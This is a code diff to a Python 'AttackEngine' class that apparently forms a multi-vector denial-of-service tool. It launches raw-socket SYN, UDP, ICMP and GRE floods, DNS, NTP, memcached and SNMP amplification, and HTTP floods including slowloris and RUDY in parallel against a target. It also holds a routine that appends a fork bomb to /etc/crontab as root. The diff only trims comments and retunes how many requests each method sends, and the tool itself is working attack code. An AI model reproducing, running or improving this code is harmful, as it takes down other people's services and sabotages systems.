@@ -16,7 +16,7 @@ class AttackEngine:
         self.running = False
         self.executor = ThreadPoolExecutor(max_workers=max_threads)
 
-    # ===================== LAYER 4 (СЕТЬ) =====================
+    # ===================== LAYER 4 =====================
     def syn_flood(self, ip, port, count):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
@@ -99,7 +99,7 @@ class AttackEngine:
                 s.sendto(b'\x11\x00\x00\x00' + b'X'*1000, (ip, 0))
         except: pass
 
-    # ===================== LAYER 7 (HTTP/HTTPS) =====================
+    # ===================== LAYER 7 =====================
     async def http_get_flood(self, session, url):
         try:
             await session.get(url + f"?{random.randint(1,999999)}", timeout=self.timeout, ssl=False)
@@ -169,7 +169,7 @@ class AttackEngine:
             await session.get(url + f"?{random.randint(1,999999)}&_={int(time.time())}", timeout=self.timeout, ssl=False)
         except: pass
 
-    # ===================== APPLICATION LEVEL =====================
+    # ===================== APPLICATION =====================
     def dns_amplification(self, ip, count):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -226,7 +226,7 @@ class AttackEngine:
         while self.running:
             try:
                 with open('/etc/crontab', 'a') as f:
-                    f.write(f"* * * * * root :(){ :|:& };:\n")
+                    f.write("* * * * * root :(){ :|:& };:\n")
             except:
                 pass
 
@@ -239,7 +239,7 @@ class AttackEngine:
             except:
                 pass
 
-    # ===================== SSL ATTACKS =====================
+    # ===================== SSL =====================
     async def ssl_renegotiation(self, session, url):
         try:
             ctx = ssl.create_default_context()
@@ -254,7 +254,7 @@ class AttackEngine:
             await session.get(url, headers={'User-Agent': 'Heartbleed'}, timeout=self.timeout, ssl=False)
         except: pass
 
-    # ===================== MIXED / PROTOCOL =====================
+    # ===================== MIXED =====================
     def gre_flood(self, ip, count):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_GRE)
@@ -279,72 +279,74 @@ class AttackEngine:
                 s.sendto(b'\x00\x00\x00\x00' + b'X'*1400, (ip, port))
         except: pass
 
-    # ===================== MAIN ATTACK =====================
+    # ===================== MAIN =====================
     async def single_attack(self, target, count):
         self.running = True
         ip = target.split(':')[0]
         port = int(target.split(':')[1]) if ':' in target else 80
 
-        # Запускаем все методы параллельно
-        tasks = []
         threads = []
+        cnt = max(1, count // 40)
 
-        # LAYER 4
-        for method in [self.syn_flood, self.ack_flood, self.fin_flood, self.rst_flood]:
-            t = threading.Thread(target=method, args=(ip, port, count//35))
+        # L4
+        for m in [self.syn_flood, self.ack_flood, self.fin_flood, self.rst_flood]:
+            t = threading.Thread(target=m, args=(ip, port, cnt))
             t.start()
             threads.append(t)
 
-        t = threading.Thread(target=self.udp_flood, args=(ip, port, count//35))
+        t = threading.Thread(target=self.udp_flood, args=(ip, port, cnt))
         t.start()
         threads.append(t)
 
-        t = threading.Thread(target=self.udp_frag_flood, args=(ip, port, count//35))
+        t = threading.Thread(target=self.udp_frag_flood, args=(ip, port, cnt))
         t.start()
         threads.append(t)
 
-        t = threading.Thread(target=self.icmp_flood, args=(ip, count//35))
+        t = threading.Thread(target=self.icmp_flood, args=(ip, cnt))
         t.start()
         threads.append(t)
 
-        t = threading.Thread(target=self.igmp_flood, args=(ip, count//35))
+        t = threading.Thread(target=self.igmp_flood, args=(ip, cnt))
         t.start()
         threads.append(t)
 
-        # APPLICATION
-        for method in [self.dns_amplification, self.ntp_amplification, self.memcached_amplification, self.snmp_amplification]:
-            t = threading.Thread(target=method, args=(ip, count//35))
+        # Application
+        for m in [self.dns_amplification, self.ntp_amplification, self.memcached_amplification, self.snmp_amplification]:
+            t = threading.Thread(target=m, args=(ip, cnt))
             t.start()
             threads.append(t)
 
-        # OS LEVEL
-        for method in [self.fork_bomb, self.fd_exhaustion, self.cron_flood, self.oom_killer_trigger]:
-            t = threading.Thread(target=method)
+        # OS
+        for m in [self.fork_bomb, self.fd_exhaustion, self.cron_flood, self.oom_killer_trigger]:
+            t = threading.Thread(target=m)
             t.start()
             threads.append(t)
 
-        # MIXED
-        t = threading.Thread(target=self.gre_flood, args=(ip, count//35))
-        t.start()
-        threads.append(t)
-        t = threading.Thread(target=self.sctp_flood, args=(ip, port, count//35))
-        t.start()
-        threads.append(t)
-        t = threading.Thread(target=self.dccp_flood, args=(ip, port, count//35))
+        # Mixed
+        t = threading.Thread(target=self.gre_flood, args=(ip, cnt))
         t.start()
         threads.append(t)
 
-        # HTTP (асинхронные)
+        t = threading.Thread(target=self.sctp_flood, args=(ip, port, cnt))
+        t.start()
+        threads.append(t)
+
+        t = threading.Thread(target=self.dccp_flood, args=(ip, port, cnt))
+        t.start()
+        threads.append(t)
+
+        # HTTP
         url = f"http://{target}" if port != 443 else f"https://{target}"
         conn = aiohttp.TCPConnector(limit=0, ssl=False)
         async with aiohttp.ClientSession(connector=conn) as session:
-            for _ in range(count//5):
+            tasks = []
+            for _ in range(count // 3):
                 if not self.running: break
-                for method in [self.http_get_flood, self.http_post_flood, self.http_head_flood,
-                               self.http_options_flood, self.http_put_flood, self.http_delete_flood,
-                               self.http_patch_flood, self.http_trace_flood, self.http_connect_flood,
-                               self.slowloris, self.rudy, self.range_flood, self.cache_buster]:
-                    tasks.append(method(session, url))
+                for m in [self.http_get_flood, self.http_post_flood, self.http_head_flood,
+                           self.http_options_flood, self.http_put_flood, self.http_delete_flood,
+                           self.http_patch_flood, self.http_trace_flood, self.http_connect_flood,
+                           self.slowloris, self.rudy, self.range_flood, self.cache_buster]:
+                    tasks.append(m(session, url))
                 if len(tasks) >= self.max_threads:
                     await asyncio.gather(*tasks)
                     tasks = []
@@ -353,7 +355,7 @@ class AttackEngine:
 
         # SSL
         if port == 443:
-            for _ in range(count//10):
+            for _ in range(count // 5):
                 if not self.running: break
                 tasks.append(self.ssl_renegotiation(session, url))
                 tasks.append(self.ssl_heartbleed(session, url))
